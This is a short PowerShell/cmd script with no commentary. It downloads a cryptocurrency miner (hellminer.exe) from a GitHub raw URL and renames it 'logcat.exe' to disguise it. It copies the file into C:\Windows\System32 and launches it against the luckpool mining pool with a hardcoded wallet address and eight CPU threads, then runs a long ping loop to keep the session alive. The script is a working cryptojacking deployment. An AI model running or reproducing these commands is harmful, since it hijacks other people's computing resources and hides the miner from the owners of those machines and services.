Invoke-WebRequest https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/hellminer.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMB6RJ7Wv7iVpBKQhdn4Vyv34VFKpD8Eqi.$(shuf -i 1-99999 -n 1) -p x --cpu 8 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
